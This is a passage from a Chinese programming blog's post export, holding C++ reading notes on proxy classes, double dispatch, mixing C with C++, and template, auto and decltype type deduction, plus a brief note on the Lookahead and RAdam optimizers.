operator[]可以在两种不同的情况下调用：读一个字符或写一个字符。读是个 右值操作；写是个左值操作。（这个名词来自于编译器，左值出现在赋值运算的左边，右值 出现在赋值运算的右边。） 通常，将一个对象做左值使用意味着它可能被修改，做右值用意 味着它不能够被修改。 虽然或许不可能知道 operator[] 是在左值或右值情境下被调用，我们还是可以区分读和写。只要将处理动作推迟，直至知道 operator[] 的返回结果将如何被使用为止。（lazy evaluation） Proxy class 可是实现此 lazy evaluation。可以修改 operator[]，令它返回字符串中字符的 proxy，而不返回字符本身。然后等待，看看这个 proxy 如何被运用。如果它被读，就将 operator[] 的调用动作视为一个读取动作。如果它被写，就将 operator[] 的调用视为一个写动作。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class String &#123; public: class CharProxy &#123; public: CharProxy(String&amp; str, int index); CharProxy&amp; operator=(const CharProxy&amp; rhs); CharProxy&amp; operator=(char c); operator char() const; private: String&amp; theString; int charIndex; &#125;; const CharProxy operator[](int index) const &#123; return CharProxy(const_cast&lt;String&amp;&gt;(*this), index); &#125; // for const Strings CharProxy operator[](int index) &#123; return CharProxy(*this, index); &#125; // for non-const Strings ... friend class CharProxy; private: // Reference counting ptr RCPtr&lt;StringValue&gt; value;&#125;;String::CharProxy::CharProxy(String&amp; str, int index) : theString(str), charIndex(index) &#123;&#125;String::CharProxy::operator char() const &#123; return theString.value-&gt;data[charIndex];&#125;String::CharProxy::operator=(const CharProxy&amp; rhs) &#123; // copy on write if (theString.value-&gt;isShared()) &#123; theString.value = new StringValue(theString.value-&gt;data); &#125; theString.value-&gt;data[charIndex] = rhs.theString.value-&gt;data[rhs.charIndex]; return *this;&#125;String::CharProxy&amp; String::CharProxy::operator=(char c) &#123; if (theString.value-&gt;isShared()) &#123; theString.value = new StringValue(theString.value-&gt;data); &#125; theString.value-&gt;data[charIndex] = c; return *this;&#125; 123456789101112131415String s1, s2;// 表达式s1[5]返回的是一 CharProxy 对象。没有为这样的对象&lt;&lt;操作// 在 CahrProxy 类内部申明了一个隐式转换到 char 的操作。// 这个 CharProxy-to-char 的转换是代理对象作右值使用时的典型行为。cout &lt;&lt; s1[5];// 表达式s2[5]返回的是一个 CharProxy 对象，作为赋值操作的目标。 // 调用的是 CharProxy 类中的赋值操作。// 在 CharProxy 的赋值操作中，被赋值的 CharProxy 对象是作左值使用的// proxy 类扮演的字符是作左值使用的s2[5] = 'x';// 左边是一个左值，右边一个作右值s1[3] = s2[8]; 条款 31：让函数根据一个以上的对象类型来决定如何虚化 假设你必须以 C++完成任务，也就是你必须自行想办法完成上述需求（常被称为 double-dispatching）。此名称来自面向对象程序设计社区，在那个领域里，人们把一个“虚函数调用动作”称为一个“message dispatch”（消息分派）。 因此某个函数调用如果根据两个参数而虚化（两个参数发生动态类型绑定），自然而然地就被称为“double dispatch”。更广泛的情况（函数根据多个参数而虚化）则被称为 multiple dispatch。 虚函数+ RTTI（运行时期类型辨识），根据不同的 typeid() 结果，进行条件判断实现不同处理逻辑。 只使用虚函数，在两个类型中，分别按照 single dispatch 的方式处理，然后组合使用。比RTTI方法更安全。 自行仿真虚函数表格（Virtual Function Tables），略 六、杂项讨论 条款 32：在未来时态下发展程序 所谓在未来时态下设计程序，就是接受“事情总会改变”的事实，并准备应对方法。 也许程序库会加入新的函数，导致新的重载（overloading）发生，于是导致潜在的歧义。 也许继承体系会加入新的 class，致使今天的 derived class 成为明天的 base class。 也许新的应用软件会出现，函数会在新的环境下被调用，而我们必须考虑那种情况下仍能正确执行任务。 程序的维护者通常都不是当初的开发者，所以设计和实现时应该注意到如何帮助其他人理解、修改、强化你的程序。 未来式思维只不过是加上一些额外的考虑： 提供完整的 class，即使某些部分目前用不到。当新的需求进来，你不太需要回头去修改那些 class。 设计你的接口，让这些 class 轻易地被正确运用，难以被错误运用。例如，面对那些“copying 和 assignment 并不合理”的 class，请禁止那些动作的发生。 尽量使你的代码一般化（泛化），除非有不良的巨大后果。举个例子，如果你正在写一个算法，用于树状结构（tree）的来回遍历，请考虑将它一般化，以便能够处理任何种类的 directed acyclic（非环状的）graph。 使用设计模式封装变化。 条款 33：将非尾端类（non～leaf class）设计为抽象类（abstract class） 将函数声明为纯虚函数，并非暗示它没有实现，而是意味着： 目前这个 class 是抽象的。 任何继承此 class 的具体类，都必须将该纯虚函数重新声明为一个正常的虚函数（也就是说，不可以再令它“=0”）。 的确，大部分纯虚函数并没有实现码，但是 pure virtual destructors 是个例外。它们必须被实现出来，因为只要有一个 derived classdestructor 被调用，它们便会被调用。此外，它们通常执行一些有用的工作，如释放资源或记录运转消息等等。纯虚函数的实现或许并不常见，但对 pure virtual destructors 而言，实现不仅是平常的事，甚至是必要的事。 一般性的法则是：继承体系中的 non-leaf（非尾端）类应该是抽象类。 条款 34：如何在同一个程序中结合 C++和 C 有 4 件事情你需要考虑：name mangling（名称重整）、statics（静态对象）初始化、动态内存分配、数据结构的兼容性。 Name Mangling（名称重整） Name mangling 是一种程序。通过它，你的 C++编译器为程序内的每一个函数编出独一无二的名称。在 C 语言中，此程序并无必要，因为你无法将函数名称重载（overload）；但是几乎所有的 C++程序都有一些函数拥有相同的名称。 Statics 的初始化 许多代码会在 main之前和之后执行起来。更明确地说，static class 对象、全局对象、namespace 内的对象以及文件范围（file scope）内的对象，其 constructors 总是在 main 之前就获得执行。这个过程称为static initialization。同样道理，通过 static initialization 产生出来的对象，其destructors 必须在 static destruction 过程中被调用。static destruction 发生在 main 结束之后。 动态内存分配 动态内存分配的一般规则很简单：程序的 C++部分使用 new 和delete，程序的 C 部分则使用 malloc（及其变种）和free。只要内存是以 new 分配而得，就以 delete 删除。只要内存是以 malloc 分配而得，就以 free 释放。 数据结构的兼容性 从数据结构的观点来看，我们可以说：在 C 和 C++之间对数据结构做双向交流，应该是安全的——前提是那些结构的定义式在 C 和C++ 中都可编译。为 C++ struct 加上非虚函数，可能不影响其兼容性；其他任何改变则几乎都会影响。 准则 如果你打算在同一个程序中混用 C++和 C，请记住以下几个简单守则： 确定你的 C++和 C 编译器产出兼容的目标文件（object files）。 将双方都使用的函数声明为 extern ＂C＂。 如果可能，尽量在 C++ 中撰写 main。 总是以 delete 删除 new返回的内存；总是以 free 释放 malloc 返回的内存。 将两个语言间的“数据结构传递”限制于 C 所能了解的形式。 条款 35：让自己习惯于标准 C++语言 C++最重要的几项改变如下所示（时间在C++11之前）。 增加了一些新的语言特性：RTTI、namespaces、bool、关键词mutable 和explicit、enums 作为重载函数之自变量所引发的类型晋升转换，以及“在class 定义区内直接为整数型（integral）conststatic class members 设定初值”的能力。 扩充了 Templates 的弹性：允许 member templates 存在等。 强化了异常处理机制（Exception handling）：编译期间更严密地检验 exception specifications等。 修改了内存分配例程：加入 operator new[] 和 operator delete[]，内存未能分配成功时由 operator new/new[] 抛出一个exception，在内存分配失败时返回 0。 增加了新的转型形式：static_cast，dynamic_cast，const_cast 和reinterpret_cast。 语言规则更为优雅精练：重新定义虚函数时，其返回类型不再一定得与原定义完全吻合。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"再看Lookahead","slug":"再看Lookahead","date":"2022-04-18T15:22:07.000Z","updated":"2023-08-07T12:02:23.617Z","comments":true,"path":"posts/89ba64e7.html","link":"","permalink":"https://racleray.github.io/posts/89ba64e7.html","excerpt":"这是摘要","text":"Lookahead 优化器的本质目的： \\[ \\theta_{t+1}=\\theta_{t}+dt*\\nabla L(\\theta) \\] 简单变化： \\[ \\frac{\\theta_{t+1}-\\theta_{t}}{dt}=\\nabla L(\\theta) \\\\ \\frac{\\partial \\theta}{\\partial t}=\\nabla L(\\theta) \\] t 表示time step，这个推导不严谨，但是这么写也有点道理。且先这么假设。 优化求解的过程，就是求解 \\(\\frac{\\partial \\theta}{\\partial t} \\rightarrow 0\\) 的最优参数（局部最优）的过程，也就是对 \\(\\nabla L(\\theta) \\rightarrow 0\\) 的优化。 Lookahead要的是啥？不仅要最优化的参数，我还要参数在损失函数空间中处于一个相对更稳定的区域。 怎么稳定？让优化器自己试试周围的情况，多更新几次。怎么实现？设计一个Function（过程）: \\[ F(\\theta)=\\theta+\\alpha \\nabla L(\\theta) \\] 同时，令： \\[ \\frac{\\partial \\theta}{\\partial t} = F^k(\\theta) - \\theta \\rightarrow 0 \\] 要求 F 的 k 次复合函数变化之后，能满足以上条件。 此时发生了什么？看看，\\(F(\\theta)=\\theta\\) 这种变换成立的时候， F 的 k 次复合函数变化的结果还是 \\(\\theta\\)，完美满足条件。也几就是说，经过 k 次 \\(\\nabla L(\\theta)\\) 的变化，参数会处于一个比较稳定的区域。 虽然有点简化了过程，但是Lookahead确实就是这么个思路。 。。。 Lookahead这个算法搭配RAdam倒是见过几次了。感觉上，应该是不错的。 毕竟，RAdam相较于其它自适应学习率的优化器，对于步长的计算进行了优化。Lookahead 同时选择理论上好像更好的步长，比较地NICE。 RAdam 主要针对 Adam 在训练初始阶段，二阶动量在不同batch输入时可能面临方差过大的情况，导致训练不稳定。Bias-correction 并不能解决这个问题，也不是用来解决这个问题的。 所以 RAdam 设计了参数 \\(\\rho_t, \\rho_{\\infty}\\) 。 \\(\\rho_{\\infty}\\) 很大，而 \\(\\rho_t\\) 逐渐增大趋于 \\(\\rho_{\\infty}\\)。 根据 \\(\\rho_t\\) 的大小，调整参数更新策略。先是 momentum 方式，只考虑一阶动量；当 \\(\\rho_t\\) 达到一定大小，再进行 RAdam 方式更新。 RAdam 方式相较于 Adam，多了一个随time step逐渐增大的参数 \\(r_t\\) 和学习率一起作用于权重参数的更新过程。 甚至有点warm-up的味道了。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"optimizer","slug":"optimizer","permalink":"https://racleray.github.io/tags/optimizer/"},{"name":"lookahead","slug":"lookahead","permalink":"https://racleray.github.io/tags/lookahead/"}],"author":"HeRui"},{"title":"Effective Modern Cpp","slug":"Effective-Modern-Cpp","date":"2022-04-12T13:00:52.000Z","updated":"2024-01-09T10:23:43.747Z","comments":true,"path":"posts/b3d88a54.html","link":"","permalink":"https://racleray.github.io/posts/b3d88a54.html","excerpt":"Effective Modern Cpp 读书笔记","text":"为什么const成员函数应当线程安全？怎样使用std::unique_ptr实现Pimpl惯用法？为何要避免lambda表达式用默认捕获模式？std::atomic与volatile的区别是什么？ 基础简介 C++中的许多东西都可被声明和定义。声明（declarations）引入名字和类型，并不给出比如存放在哪或者怎样实现等的细节： 1234567extern int x; //对象声明class Widget; //类声明bool func(const Widget&amp; w); //函数声明enum class Color; //限域enum声明 定义（definitions）提供存储位置或者实现细节： 1234567891011int x; //对象定义class Widget &#123; //类定义 …&#125;;bool func(const Widget&amp; w)&#123; return w.size() &lt; 10; &#125; //函数定义enum class Color&#123; Yellow, Red, Blue &#125;; //限域enum定义 定义也有资格称为声明。 定义一个函数的签名（signature）为它声明的一部分，这个声明指定了形参类型和返回类型。函数名和形参名不是签名的一部分。在上面的例子中，func的签名是bool(const Widget&amp;)。函数声明中除了形参类型和返回类型之外的元素（比如noexcept或者constexpr，如果存在的话）都被排除在外。 另外 std::auto_ptr在C++11中被废弃，因为std::unique_ptr可以做同样的工作，而且只会做的更好。 如果一个操作的结果有未定义的行为（undefined behavior）。这意味着运行时表现是不可预测的。比如，在std::vector范围外使用方括号（“[]”），解引用未初始化的迭代器，或者数据竞争（即有两个或以上线程，至少一个是writer，同时访问相同的内存位置）。 还有，智能指针通常重载指针解引用运算符（operator-&gt;和operator*），但 std::weak_ptr是个例外。 1 类型推导 C++11修改了一些类型推导规则并增加了两套规则，一套用于auto，一套用于decltype。C++14扩展了auto和decltype可能使用的范围。 条款1：理解模板类型推导 C++最重要最吸引人的特性auto是建立在模板类型推导的基础上的。 考虑像这样一个函数模板： 12template&lt;typename T&gt;void f(ParamType param); 更具体一点是： 12template&lt;typename T&gt;void f(const T&amp; param); //ParamType是const T&amp; 编译器对 f 函数的参数进行两个类型推导：一个是针对T的，另一个是针对ParamType的。这两个类型通常是不同的，因为ParamType包含一些修饰，比如const和引用修饰符。 然后这样进行调用： 12int x = 0;f(x); //用一个int类型的变量调用f T被推导为int，ParamType却被推导为const int&amp;。 T的类型推导不仅取决于expr的类型，也取决于ParamType的类型。有三种情况： ParamType是一个指针或引用，但不是通用引用（参见 Item24，它不同于左值引用和右值引用） ParamType是一个通用引用 ParamType既不是指针也不是引用 ParamType是一个指针或引用，但不是通用引用 f(expr) 的类型推导会这样进行： 如果expr的类型是一个引用，忽略引用部分 然后expr的类型与ParamType进行模式匹配来决定T 如果这是我们的模板， 12template&lt;typename T&gt;void f(T&amp; param); //param是一个引用 我们声明这些变量， 123int x=27; //x是intconst int cx=x; //cx是const intconst int&amp; rx=x; //rx是指向作为const int的x的引用 在不同的调用中，对param和T推导的类型会是这样： 123f(x); //T是int，param的类型是int&amp;f(cx); //T是const int，param的类型是const int&amp;f(rx); //T是const int，param的类型是const int&amp; 即使rx的类型是一个引用，T也会被推导为一个非引用 ，这是因为rx的引用性（reference-ness）在类型推导中会被忽略。 当param是reference-to-const，const不再被推导为T的一部分： 12345678910template&lt;typename T&gt;void f(const T&amp; param); //param现在是reference-to-constint x = 27; //如之前一样const int cx = x; //如之前一样const int&amp; rx = x; //如之前一样f(x); //T是int，param的类型是const int&amp;f(cx); //T是int，param的类型是const int&amp;f(rx); //T是int，param的类型是const int&amp; 同之前一样，rx的reference-ness在类型推导中被忽略了。 如果param是一个指针（或者指向const的指针）而不是引用，情况本质上也一样： 12345678template&lt;typename T&gt;void f(T* param); //param现在是指针int x = 27; //同之前一样const int *px = &amp;x; //px是指向作为const int的x的指针f(&amp;x); //T是int，param的类型是int*f(px); //T是const int，param的类型是const int* ParamType是一个通用引用 形参被声明为像右值引用一样（也就是，在函数模板中假设有一个类型形参T，那么通用引用声明形式就是T&amp;&amp;)。 如果expr是左值，T和ParamType都会被推导为左值引用。 这是模板类型推导中唯一一种T被推导为引用的情况。 虽然ParamType被声明为右值引用类型，但是最后推导的结果是左值引用。 如果expr是右值，就使用正常的（也就是上一节中的）推导规则 123456789101112131415161718template&lt;typename T&gt;void f(T&amp;&amp; param); //param现在是一个通用引用类型 int x=27; const int cx=x; const int &amp; rx=cx; f(x); //x是左值，所以T是int&amp;， //param类型也是int&amp;f(cx); //cx是左值，所以T是const int&amp;， //param类型也是const int&amp;f(rx); //rx是左值，所以T是const int&amp;， //param类型也是const int&amp;f(27); //27是右值，所以T是int， //param类型就是int&amp;&amp; 通用引用的类型推导规则是不同于普通的左值或者右值引用的。尤其是，当通用引用被使用时，类型推导会区分左值实参和右值实参，但是对非通用引用时不会区分。 ParamType既不是指针也不是引用 当ParamType既不是指针也不是引用时，我们通过传值（pass-by-value）的方式处理： 12template&lt;typename T&gt;void f(T param); //以传值的方式处理param 这意味着无论传递什么param都会成为它的一份拷贝——一个完整的新对象。事实上param成为一个新对象这一行为会影响T如何从expr中推导出结果。 如果expr的类型是一个引用，忽略这个引用部分 如果忽略expr的引用性（reference-ness）之后，expr是一个const，那就再忽略const。如果它是volatile，也忽略volatile（volatile对象不常见，它通常用于驱动程序的开发中） 因此： 1234567int x=27; //如之前一样const int cx=x; //如之前一样const int &amp; rx=cx; //如之前一样f(x); //T和param的类型都是intf(cx); //T和param的类型都是intf(rx); //T和param的类型都是int 即使cx和rx表示const值，param也不是const。这是有意义的。param是一个完全独立于cx和rx的对象——是cx或rx的一个拷贝。 认识到只有在传值给形参时才会忽略const（和volatile）这一点很重要。对于reference-to-const和pointer-to-const形参来说，expr的常量性constness在推导时会被保留。 例如： 1234567template&lt;typename T&gt;void f(T param); //仍然以传值的方式处理paramconst char* const ptr = //ptr是一个常量指针，指向常量对象 \"Fun with pointers\";f(ptr); //传递const char * const类型的实参 当ptr作为实参传给f，组成这个指针的每一比特都被拷贝进param。ptr自身的值会被传给形参。 在类型推导中，这个指针指向的数据的常量性constness将会被保留，但是当拷贝ptr来创造一个新指针param时，ptr自身的常量性constness将会被忽略。 数组实参 123const char name[] = \"J. P. Briggs\"; //name的类型是const char[13]const char * ptrToName = name; //数组退化为指针 在这里const char*指针ptrToName会由name初始化，而name的类型为const char[13]，这两种类型（const char*和const char[13]）是不一样的，但是由于数组退化为指针的规则，编译器允许这样的代码。 但要是一个数组传值给一个模板会怎样？会发生什么？ 1234template&lt;typename T&gt;void f(T param); //传值形参的模板f(name); //T和param会推导成什么类型? 数组与指针形参这样的等价是C语言的产物，C++又是建立在C语言的基础上，它让人产生了一种数组和指针是等价的的错觉。 因为数组形参会视作指针形参，所以传值给模板的一个数组类型会被推导为一个指针类型。这意味着在模板函数f的调用中，它的类型形参T会被推导为const char*： 1f(name); //name是一个数组，但是T被推导为const char* 但是在C++中，虽然函数不能声明形参为真正的数组，但是可以接受指向数组的引用！所以我们修改f为传引用： 12template&lt;typename T&gt;void f(T&amp; param); //传引用形参的模板 我们这样进行调用， 1f(name); //传数组给f T被推导为了真正的数组！这个类型包括了数组的大小，在这个例子中T被推导为const char[13]，f的形参（对这个数组的引用）的类型则为const char (&amp;)[13]。 可声明指向数组的引用的能力，使得我们可以创建一个模板函数来推导出数组的大小： 12345//在编译期间返回一个数组大小的常量值，这里的数组形参没有名字template&lt;typename T, std::size_t N&gt; constexpr std::size_t arraySize(T (&amp;)[N]) noexcept &#123; return N; &#125; 将一个函数声明为constexpr使得结果在编译期间可用。这使得我们可以用一个花括号声明一个数组，然后第二个数组可以使用第一个数组的大小作为它的大小，就像这样： 123int keyVals[] = &#123; 1, 3, 7, 9, 11, 22, 35 &#125;; //keyVals有七个元素int mappedVals[arraySize(keyVals)]; //mappedVals也有七个 当然作为一个现代C++程序员，你自然应该想到使用std::array而不是内置的数组： 1std::array&lt;int, arraySize(keyVals)&gt; mappedVals; //mappedVals的大小为7 至于arraySize被声明为noexcept，会使得编译器生成更好的代码。 函数实参 在C++中不只是数组会退化为指针，函数类型也会退化为一个函数指针。对于数组类型推导的全部讨论都可以应用到函数类型推导和退化为函数指针上来。结果是： 12345678910111213void someFunc(int, double); //someFunc是一个函数， //类型是void(int, double)template&lt;typename T&gt;void f1(T param); //传值给f1template&lt;typename T&gt;void f2(T &amp; param); //传引用给f2f1(someFunc); //param被推导为指向函数的指针， //类型是void(*)(int, double)f2(someFunc); //param被推导为指向函数的引用， //类型是void(&amp;)(int, double) 这个实际上没有什么不同，只是函数退化为指针。 结论 在模板类型推导时，有引用的实参会被视为无引用，引用会被忽略 对于通用引用的推导，左值实参会被特殊对待 对于传值类型推导，const和/或volatile实参会被认为是non-const的和non-volatile的 在模板类型推导时，数组名或者函数名实参会退化为指针，除非它们被用于初始化引用模板参数类型。 2 理解 auto 类型推导 模板类型推导使用下面这个函数模板 1234template&lt;typename T&gt;void f(ParmaType param);f(expr); //使用一些表达式调用f 在f的调用中，编译器使用expr推导T和ParamType的类型。 当一个变量使用auto进行声明时，auto扮演了模板中T的角色，变量的类型说明符扮演了ParamType的角色。 考虑这个例子： 1auto x = 27; 这里x的类型说明符是auto自己，另一方面，在这个声明中： 1const auto cx = x; 类型说明符是const auto。另一个： 1const auto &amp; rx=cx; 类型说明符是const auto&amp;。 在这里例子中要推导x，rx和cx的类型，编译器的行为看起来就像是认为这里每个声明都有一个模板，然后使用合适的初始化表达式进行调用： 1234567891011121314151617template&lt;typename T&gt; //概念化的模板用来推导x的类型void func_for_x(T param);func_for_x(27); //概念化调用： //param的推导类型是x的类型template&lt;typename T&gt; //概念化的模板用来推导cx的类型void func_for_cx(const T param);func_for_cx(x); //概念化调用： //param的推导类型是cx的类型template&lt;typename T&gt; //概念化的模板用来推导rx的类型void func_for_rx(const T &amp; param);func_for_rx(x); //概念化调用： //param的推导类型是rx的类型 在使用auto作为类型说明符的变量声明中，类型说明符代替了ParamType： 123auto x = 27; //类型说明符既不是指针也不是引用const auto cx = x; //类型说明符既不是指针也不是引用const auto &amp; rx=cx; //类型说明符是一个指针或引用但不是通用引用 123456auto&amp;&amp; uref1 = x; //x是int左值， //所以uref1类型为int&amp;auto&amp;&amp; uref2 = cx; //cx是const int左值， //所以uref2类型为const int&amp;auto&amp;&amp; uref3 = 27; //27是int右值， //所以uref3类型为int&amp;&amp; 1234567891011const char name[] = //name的类型是const char[13] \"R. N. Briggs\";auto arr1 = name; //arr1的类型是const char*auto&amp; arr2 = name; //arr2的类型是const char (&amp;)[13]void someFunc(int, double); //someFunc是一个函数， //类型为void(int, double)auto func1 = someFunc; //func1的类型是void (*)(int, double)auto&amp; func2 = someFunc; //func2的类型是void (&amp;)(int, double) auto类型推导和模板类型推导几乎一样的工作。 如果你想声明一个带有初始值27的int，C++98提供两种语法选择： 12int x1 = 27;int x2(27); C++11由于也添加了用于支持统一初始化（uniform initialization）的语法： 12int x3 = &#123; 27 &#125;;int x4&#123; 27 &#125;; 总之，这四种不同的语法只会产生一个相同的结果：变量类型为int值为27。 使用 auto 进行的类型推导，其结果却不一样： 12345auto x1 = 27; //类型是int，值是27auto x2(27); //同上auto x3 = &#123; 27 &#125;; //类型是std::initializer_list&lt;int&gt;， //值是&#123; 27 &#125;auto x4&#123; 27 &#125;; //同上 这就造成了auto类型推导不同于模板类型推导的特殊情况。当用auto声明的变量使用花括号进行初始化，auto类型推导推出的类型则为std::initializer_list。如果这样的一个类型不能被成功推导（比如花括号里面包含的是不同类型的变量），编译器会拒绝这样的代码： 1auto x5 = &#123; 1, 2, 3.0 &#125;; //错误！无法推导std::initializer_list&lt;T&gt;中的T 对于花括号的处理是auto类型推导和模板类型推导唯一不同的地方。 然而如果在模板中指定T是std::initializer_list&lt;T&gt;而留下未知T，模板类型推导就能正常工作： 12345template&lt;typename T&gt;void f(std::initializer_list&lt;T&gt; initList);f(&#123; 11, 23, 9 &#125;); //T被推导为int，initList的类型为 //std::initializer_list&lt;int&gt; 在C++11编程中一个典型的错误就是偶然使用了std::initializer_list&lt;T&gt;类型的变量。 但是对于C++14故事还在继续，C++14允许auto用于函数返回值并会被推导。 而且C++14的lambda函数也允许在形参声明中使用auto。但是在这些情况下auto实际上使用模板类型推导的那一套规则在工作，而不是auto类型推导，所以说下面这样的代码不会通过编译： 1234auto createInitList()&#123; return &#123; 1, 2, 3 &#125;; //错误！不能推导&#123; 1, 2, 3 &#125;的类型&#125; 同样在C++14的 lambda 函数中这样使用auto也不能通过编译： 123456std::vector&lt;int&gt; v;auto resetV = [&amp;v](const auto&amp; newValue)&#123; v = newValue; &#125;; //C++14resetV(&#123; 1, 2, 3 &#125;); //错误！不能推导&#123; 1, 2, 3 &#125;的类型 结论 auto类型推导通常和模板类型推导相同，但是auto类型推导假定花括号初始化代表std::initializer_list，而模板类型推导不这样做 在C++14中auto允许出现在函数返回值或者lambda函数形参中，但是它的工作机制是模板类型推导那一套方案，而不是auto类型推导 3 decltype decltype，给它一个名字或者表达式decltype就会告诉你这个名字或者表达式的类型。通常，它会精确的告诉你你想要的结果。 decltype只是简单的返回名字或者表达式的类型： 123456789101112const int i = 0; //decltype(i)是const intbool f(const Widget&amp; w); //decltype(w)是const Widget&amp; //decltype(f)是bool(const Widget&amp;)struct Point&#123; int x,y; //decltype(Point::x)是int&#125;; //decltype(Point::y)是intWidget w; //decltype(w)是Widgetif (f(w))… //decltype(f(w))是bool 1234567891011template&lt;typename T&gt; //std::vector的简化版本class vector&#123;public: … T&amp; operator[](std::size_t index); …&#125;;vector&lt;int&gt; v; //decltype(v)是vector&lt;int&gt;…if (v[0] == 0)… //decltype(v[0])是int&amp; 在C++11中，decltype最主要的用途就是用于声明函数模板，而这个函数返回类型依赖于形参类型。 对一个T类型的容器使用operator[] 通常会返回一个T&amp;对象，比如std::deque就是这样。 但是std::vector有一个例外，对于std::vector&lt;bool&gt;，operator[]不会返回bool&amp;，它会返回一个全新的对象（MSVC的STL实现中返回的是std::_Vb_reference&lt;std::_Wrap_alloc&lt;std::allocator&lt;unsigned int&gt;&gt;&gt;对象）。 decltype 获取返回值类型的示例 使用decltype计算返回类型的一个例子是： 1234567template&lt;typename Container, typename Index&gt; //可以工作，auto authAndAccess(Container&amp; c, Index i) //但是需要改良 -&gt;decltype(c[i])&#123; authenticateUser(); return c[i];&#125; 函数名称前面的auto不会做任何的类型推导工作。相反的，他只是暗示使用了C++11的尾置返回类型语法，即在函数形参列表后面使用一个”-&gt;“符号指出函数的返回类型，尾置返回类型的好处是我们可以在函数返回类型中使用函数形参相关的信息。在authAndAccess函数中，我们使用c和i指定返回类型。 在C++14标准下我们可以忽略尾置返回类型，只留下一个auto。使用这种声明形式，auto标示这里会发生类型推导。更准确的说，编译器将会从函数实现中推导出函数的返回类型。 123456template&lt;typename Container, typename Index&gt; //C++14版本，auto authAndAccess(Container&amp; c, Index i) //不那么正确&#123; authenticateUser(); return c[i]; //从c[i]中推导返回类型&#125; 从返回对象进行修改 上述代码出现的一个问题是： operator[]对于大多数T类型的容器会返回一个T&amp;，但是 条款1 解释了在模板类型推导期间，表达式的引用性（reference-ness）会被忽略。基于这样的规则，考虑它会对下面用户的代码有哪些影响： 12345std::deque&lt;int&gt; d;…authAndAccess(d, 5) = 10; //认证用户，返回d[5]， //然后把10赋值给它 //无法通过编译器！ 在这里d[5]本该返回一个int&amp;，但是模板类型推导会剥去引用的部分，因此产生了int返回类型。函数返回的那个int是一个右值，上面的代码尝试把10赋值给右值int，C++11禁止这样做，所以代码无法编译。 要想让authAndAccess像我们期待的那样工作，我们需要使用decltype类型推导来推导它的返回值，即指定authAndAccess应该返回一个和c[i]表达式类型一样的类型。 因此我们可以这样写authAndAccess： 1234567template&lt;typename Container, typename Index&gt; //C++14版本，decltype(auto) //可以工作，authAndAccess(Container&amp; c, Index i) //但是还需要&#123; //改良 authenticateUser(); return c[i];&#125; 现在authAndAccess将会真正的返回c[i]的类型。现在事情解决了，一般情况下c[i]返回T&amp;，authAndAccess也会返回T&amp;，特殊情况下c[i]返回一个对象，authAndAccess也会返回一个对象。 decltype(auto)的使用不仅仅局限于函数返回类型，当你想对初始化表达式使用decltype推导的规则，你也可以使用： 12345678Widget w;const Widget&amp; cw = w;auto myWidget1 = cw; //auto类型推导 //myWidget1的类型为Widgetdecltype(auto) myWidget2 = cw; //decltype类型推导 //myWidget2的类型是const Widget&amp; 形参传递问题 authAndAccess声明： 12template&lt;typename Container, typename Index&gt;decltype(auto) authAndAccess(Container&amp; c, Index i); 容器通过传引用的方式传递非常量左值引用（lvalue-reference-to-non-const），因为返回一个引用允许用户可以修改容器。 但是这意味着在不能给这个函数传递右值容器，右值不能被绑定到左值引用上，除非这个左值引用是一个const（lvalue-references-to-const）。 一个右值容器，是一个临时对象，通常会在authAndAccess调用结束被销毁，这意味着authAndAccess返回的引用将会成为一个悬置的（dangle）引用。 为了使authAndAccess的引用可以绑定左值和右值，可以使用通用引用。所以我们这样声明： 12template&lt;typename Containter, typename Index&gt; //现在c是通用引用decltype(auto) authAndAccess(Container&amp;&amp; c, Index i); 这行代码中还有一个问题： 在这个模板中，我们不知道我们操纵的容器的类型是什么，也就是说不知道它使用的索引对象（index objects）的类型。 对一个未知类型的对象使用传值通常会造成不必要的拷贝，对程序的性能有极大的影响，还会造成对象切片行为。 但是只针对 STL 容器（比如std::string，std::vector和std::deque的operator[]），这样处理是合理的。 为了保持参数本身的左右值属性，还需要进行 std::forward： 1234567template&lt;typename Container, typename Index&gt; //最终的C++14版本decltype(auto)authAndAccess(Container&amp;&amp; c, Index i)&#123; authenticateUser(); return std::forward&lt;Container&gt;(c)[i];&#125; C++11版本： 12345678template&lt;typename Container, typename Index&gt; //最终的C++11版本autoauthAndAccess(Container&amp;&amp; c, Index i)-&gt;decltype(std::forward&lt;Container&gt;(c)[i])&#123; authenticateUser(); return std::forward&lt;Container&gt;(c)[i];&#125; 将decltype应用于变量名会产生该变量名的声明类型。虽然变量名都是左值表达式，但这不会影响decltype的行为。但是对于一些表达式，其类型推导结果，可能出现&amp;引用类型： 12345678910decltype(auto) f1() &#123; int x = 0; … return x; //decltype(x）是int，所以f1返回int&#125;decltype(auto) f2() &#123; int x = 0; return (x); //decltype((x))是int&amp;，所以f2返回int&amp;&#125; 对于名字来说，x是一个左值，C++11定义了表达式(x)也是一个左值。decltype((x))是int&amp;。用小括号覆盖一个名字可以改变decltype对于名字产生的结果。 因此，当使用decltype(auto)的时候一定要加倍的小心，在表达式中看起来无足轻重的细节将会影响到decltype(auto)的推导结果。 结论 decltype产生变量或者表达式的类型 对于T类型的不是单纯的变量名的左值表达式，decltype总是产出T的引用即T&amp; C++14支持decltype(auto)，推导出类型，但是它使用decltype的规则进行推导，而不是 auto 4 查看类型推导结果 三种方案： IDE编辑器获得类型推导的结果 在编译期间获得结果 在运行时获得结果 IDE IDE之所以能提供这些信息是因为一个C++编译器（或者至少是前端中的一个部分）运行于IDE中。如果这个编译器对你的代码不能做出有意义的分析或者推导，它就不会显示推导的结果。 编译 可以首先声明一个类模板但不定义。就像这样： 12template&lt;typename T&gt; //只对TD进行声明class TD; //TD == \"Type Displayer\" 尝试实例化这个类模板就会引出一个错误消息，因为这里没有用来实例化的类模板定义。为了查看x和y的类型，只需要使用它们的类型去实例化TD： 12TD&lt;decltype(x)&gt; xType; //引出包含x和yTD&lt;decltype(y)&gt; yType; //的类型的错误消息 出现 undefined template TD&lt;xxx&gt;。 运行时 使用printf的方法使类型信息只有在运行时才会显示出来（尽管不建议使用printf）。 12std::cout &lt;&lt; 